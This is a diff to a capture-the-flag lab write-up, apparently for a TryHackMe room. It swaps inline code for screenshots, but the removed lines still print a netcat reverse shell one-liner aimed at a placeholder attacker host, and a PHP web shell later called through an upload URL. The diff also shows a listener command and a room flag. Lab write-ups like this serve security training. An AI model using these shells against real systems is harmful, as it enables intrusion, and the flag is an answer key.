@@ -126,13 +126,21 @@ Using a reverse or bind shell, exploit the command injection vulnerability to ge
 
 First, we can run `nc -lnvp 4444`.
 
+![alt text](<Screenshot 2025-09-15 215708.png>)
+
 And then, open a new terminal and run this command to know what IP we have: `ip addr show tun0`
 
 Open the browser, go to `[MACHINE_IP]:8080`, and click "Reverse/Bind Shell Tank".
 
-And then, you can fill the input field** with this reverse shell command `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+![alt text](<Screenshot 2025-09-15 221830.png>)
+
+And then, you can fill the input field** with this reverse shell command 
+
+![alt text](<Screenshot 2025-09-15 221954.png>)
 
 And then, our listener will get a connection and we can get the flag.
+
+![alt text](<Screenshot 2025-09-15 222818.png>)
 
 > THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}
 
@@ -142,17 +150,15 @@ We can go to `[MACHINE_IP]:8082`.
 
 And then, we can create a file named `shell.php` with this script:
 
-```php
-<?php
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
-?>
-```
+![alt text](<Screenshot 2025-09-15 223856.png>)
 
 Keep the listener running on port 4444.
 
+![alt text](<Screenshot 2025-09-15 224154.png>)
+
 We can upload the `shell.php` file to the website until **the upload is successful**.
+
+![alt text](<Screenshot 2025-09-15 224303.png>)
 
 And then, go to this URL `[MACHINE_IP]:8082/uploads/shell.php?cmd=cat%20/flag.txt` and we get the flag.
 
